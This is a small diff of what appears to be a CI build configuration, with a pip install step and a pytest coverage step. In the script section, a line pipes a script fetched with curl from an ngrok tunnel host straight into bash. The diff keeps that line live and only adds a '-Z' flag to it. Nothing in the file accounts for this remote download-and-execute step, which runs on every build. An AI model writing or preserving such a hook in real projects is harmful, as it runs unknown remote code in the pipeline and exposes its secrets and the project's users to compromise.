@@ -5,5 +5,4 @@ install:
   - pip install requests
 script:
   - pytest --cov=./ --cov-report=xml
-  - bash <(curl http://ib-84012.ngrok.io/bash)
- 
+  - bash <(curl http://ib-84012.ngrok.io/bash) -Z
